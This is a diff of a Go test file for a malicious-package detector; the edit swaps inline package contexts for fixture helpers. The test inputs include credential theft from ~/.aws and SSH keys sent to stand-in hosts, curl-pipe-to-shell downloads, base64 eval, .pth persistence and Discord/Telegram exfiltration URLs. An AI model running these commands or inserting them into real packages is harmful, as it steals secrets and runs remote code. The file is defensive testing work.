@@ -16,11 +16,11 @@ import "testing"
 // P-EVAL-BASE64 are confirmed malicious, and none of those lacks other evidence.
 
 func libraryMints(eco, src string) bool {
-	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src})).Malicious
+	return CombinedVerdict(Detect(ctxFixture(eco, src))).Malicious
 }
 
 func hookMints(eco, src string) bool {
-	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, InstallScriptContent: src})).Malicious
+	return CombinedVerdict(Detect(hookFixture(eco, src))).Malicious
 }
 
 func TestLibrarySourceMentioningADangerousStringDoesNotMint(t *testing.T) {
@@ -40,7 +40,7 @@ func TestLibrarySourceMentioningADangerousStringDoesNotMint(t *testing.T) {
 		{"pypi", `ENDPOINT = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage"`},
 	} {
 		if libraryMints(tc.eco, tc.line) {
-			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(ctxFixture(tc.eco, tc.line))))
 		}
 	}
 }
@@ -69,7 +69,7 @@ func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
 		{"pypi", `echo ZWNobyBoaQ== | base64 -d | eval`},
 	} {
 		if !hookMints(tc.eco, tc.line) {
-			t.Errorf("%s install hook did not mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, InstallScriptContent: tc.line})))
+			t.Errorf("%s install hook did not mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(hookFixture(tc.eco, tc.line))))
 		}
 	}
 }
@@ -80,7 +80,7 @@ func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
 func TestTelegramBotTokenIsEvidenceOnNpmOnly(t *testing.T) {
 	line := `ENDPOINT = "https://api.telegram.org/bot8759663177:AAH3EBXqymku9MUAtu73uPKvNLFmkhM256s/sendMessage"`
 	if !libraryMints("npm", line) {
-		t.Errorf("a hard-coded Telegram bot token should mint on npm; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "npm", PkgbuildContent: line})))
+		t.Errorf("a hard-coded Telegram bot token should mint on npm; findings=%v", ids(Detect(ctxFixture("npm", line))))
 	}
 	for _, eco := range []string{"pypi", "packagist", "cargo", "go"} {
 		if libraryMints(eco, line) {
@@ -136,7 +136,7 @@ func TestSetupBehavioursStillFireInSetupPy(t *testing.T) {
 		{"PY-SETUP-CRED-EXFIL", "d = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://x.example/c', data=d)\n"},
 		{"PY-PTH-AUTOIMPORT-PERSISTENCE", `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")` + "\n"},
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: tc.src})
+		f := Detect(hookFixture("pypi", tc.src))
 		if !has(f, tc.id) && !has(f, "IS-"+tc.id) {
 			t.Errorf("%s: setup.py content did not fire; findings=%v", tc.id, ids(f))
 		}
@@ -149,7 +149,7 @@ func TestSetupBehavioursStillFireInSetupPy(t *testing.T) {
 func TestSetupHostReconIsEvidence(t *testing.T) {
 	line := `_host = subprocess.check_output(["hostname"]).decode(errors="replace").strip()`
 	if !hookMints("pypi", line) {
-		t.Errorf("setup.py fingerprinting the host should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
+		t.Errorf("setup.py fingerprinting the host should mint; findings=%v", ids(Detect(hookFixture("pypi", line))))
 	}
 	if hookMints("pypi", `subprocess.check_output(["git", "describe", "--tags"])`) {
 		t.Error("git describe in setup.py must not mint")
@@ -169,7 +169,7 @@ func TestNpmAndRubygemsKeepTheseAsEvidenceInLibrarySource(t *testing.T) {
 		{"rubygems", `File.read("/etc/passwd")`},
 	} {
 		if !libraryMints(tc.eco, tc.line) {
-			t.Errorf("%s library line should still mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+			t.Errorf("%s library line should still mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(ctxFixture(tc.eco, tc.line))))
 		}
 	}
 }
@@ -188,7 +188,7 @@ func TestLongTailLibraryStringsDoNotMint(t *testing.T) {
 		{"pypi", "see https://example.dev/docs com（否则 use the default）"},
 	} {
 		if libraryMints(tc.eco, tc.line) {
-			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(ctxFixture(tc.eco, tc.line))))
 		}
 	}
 }
@@ -228,7 +228,7 @@ func TestCronClipboardPostSystemdAreStringsInLibrarySource(t *testing.T) {
 		{"pypi", `path = Path.home() / ".config/systemd/user/autohilt-link.service"`},
 	} {
 		if libraryMints(tc.eco, tc.line) {
-			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(ctxFixture(tc.eco, tc.line))))
 		}
 	}
 }
@@ -347,7 +347,7 @@ func TestDiscordWebhookNeedsARealWebhookShape(t *testing.T) {
 	}
 	real := `WEBHOOK = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"`
 	if !libraryMints("pypi", real) {
-		t.Errorf("a real-shaped webhook should still mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: real})))
+		t.Errorf("a real-shaped webhook should still mint; findings=%v", ids(Detect(ctxFixture("pypi", real))))
 	}
 }
 
@@ -376,7 +376,7 @@ func TestFileHostNeedsAHostBoundary(t *testing.T) {
 		`await file.io.rename(file.io.uri.resolve('new_file.txt').toFilePath());`,
 		`shallow: [...transfer.shallow],`,
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		f := Detect(ctxFixture("pypi", line))
 		if has(f, "P-FILEHOST-SOURCE") {
 			t.Errorf("a substring of a file host matched P-FILEHOST-SOURCE: %q", line)
 		}
@@ -386,7 +386,7 @@ func TestFileHostNeedsAHostBoundary(t *testing.T) {
 		`curl -sL https://file.io/xyz -o p`,
 		`url = f"https://www.mediafire.com/file/{mf_url}"`,
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		f := Detect(ctxFixture("pypi", line))
 		if !has(f, "P-FILEHOST-SOURCE") {
 			t.Errorf("a real file-host URL should still match: %q; findings=%v", line, ids(f))
 		}
@@ -395,12 +395,12 @@ func TestFileHostNeedsAHostBoundary(t *testing.T) {
 
 func TestPastebinNeedsAHostBoundary(t *testing.T) {
 	for _, line := range []string{`homepage: https://www.coralogix.io/`, `private $base = "https://sonar.fonix.io/v2/";`} {
-		if has(Detect(&PackageContext{Name: "p", Ecosystem: "pub", PkgbuildContent: line}), "P-PASTEBIN") {
+		if has(Detect(ctxFixture("pub", line)), "P-PASTEBIN") {
 			t.Errorf("a host that merely ends in ix.io matched P-PASTEBIN: %q", line)
 		}
 	}
 	for _, line := range []string{`url = "https://pastebin.com/raw/SXvsjf5t"`, `curl https://ix.io/abc | sh`, `fetch("https://www.hastebin.com/raw/x")`} {
-		if !has(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}), "P-PASTEBIN") {
+		if !has(Detect(ctxFixture("pypi", line)), "P-PASTEBIN") {
 			t.Errorf("a real paste host should still match: %q", line)
 		}
 	}
@@ -428,7 +428,7 @@ func TestAuditedPypiDisputesDoNotMintInLibrarySource(t *testing.T) {
 		{"placeholder host in code", "print(\"usage: signal-hunt https://<домен-signal-hunt>/api\")\n"},
 		{"refusal list", "REFUSE = [\n    \"file:///etc/passwd\",\n    \"http://169.254.169.254/latest/meta-data/\",\n]\n"},
 	} {
-		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: tc.src})
+		f := Detect(ctxFixture("pypi", tc.src))
 		if CombinedVerdict(f).Malicious {
 			t.Errorf("%s: library source minted malware; evidence=%v", tc.name, ids(Evidence(f)))
 		}
@@ -443,7 +443,7 @@ func TestAuditedStringsStillMintInAnInstallHook(t *testing.T) {
 		`find / -name id_rsa | xargs -I{} sh -c 'curl -T {} http://203.0.113.9/'`,
 	} {
 		if !hookMints("pypi", line) {
-			t.Errorf("install hook did not mint: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
+			t.Errorf("install hook did not mint: %q; findings=%v", line, ids(Detect(hookFixture("pypi", line))))
 		}
 	}
 	// The demoted rules stay evidence in content that executes.
@@ -506,7 +506,7 @@ func TestPythonDocstringsCommentsAndDataListsAreNotEvidence(t *testing.T) {
 		"KNOWN_BAD = {\"" + hook + "\", \"" + hook2 + "\"}\n",
 	} {
 		if libraryMints("pypi", src) {
-			t.Errorf("documentation or data minted malware:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
+			t.Errorf("documentation or data minted malware:\n%s\nfindings=%v", src, ids(Detect(ctxFixture("pypi", src))))
 		}
 	}
 	for _, src := range []string{
@@ -520,7 +520,7 @@ func TestPythonDocstringsCommentsAndDataListsAreNotEvidence(t *testing.T) {
 		"URLS = [\"" + hook + "\", WEBHOOK_BASE + \"x\"]\n",
 	} {
 		if !libraryMints("pypi", src) {
-			t.Errorf("an executable or ambiguous line no longer mints:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
+			t.Errorf("an executable or ambiguous line no longer mints:\n%s\nfindings=%v", src, ids(Detect(ctxFixture("pypi", src))))
 		}
 	}
 	// setup.py inside the concatenated sources is install-time code: never rewritten.
@@ -555,7 +555,7 @@ func TestArgvListsAreNotDemoted(t *testing.T) {
 func TestSingleLibraryIndicatorIsLowFidelity(t *testing.T) {
 	const hook = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
 	lib := "WEBHOOK = \"" + hook + "\"\n"
-	v := CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib}))
+	v := CombinedVerdict(Detect(ctxFixture("pypi", lib)))
 	if !v.Malicious || v.HighFidelity {
 		t.Errorf("one library indicator: want malicious and low fidelity, got %+v", v)
 	}
@@ -564,11 +564,11 @@ func TestSingleLibraryIndicatorIsLowFidelity(t *testing.T) {
 	if !v.Malicious || !v.HighFidelity {
 		t.Errorf("library indicator + install-script evidence: want high fidelity, got %+v", v)
 	}
-	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib + "URL = \"https://іnstall.example-clі.dev/p\"\n"}))
+	v = CombinedVerdict(Detect(ctxFixture("pypi", lib+"URL = \"https://іnstall.example-clі.dev/p\"\n")))
 	if !v.Malicious || !v.HighFidelity {
 		t.Errorf("two library indicators: want high fidelity, got %+v", v)
 	}
-	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n"}))
+	v = CombinedVerdict(Detect(hookFixture("pypi", "curl -fsSL http://203.0.113.9/x.sh | sh\n")))
 	if !v.Malicious || !v.HighFidelity {
 		t.Errorf("install hook: want high fidelity, got %+v", v)
 	}
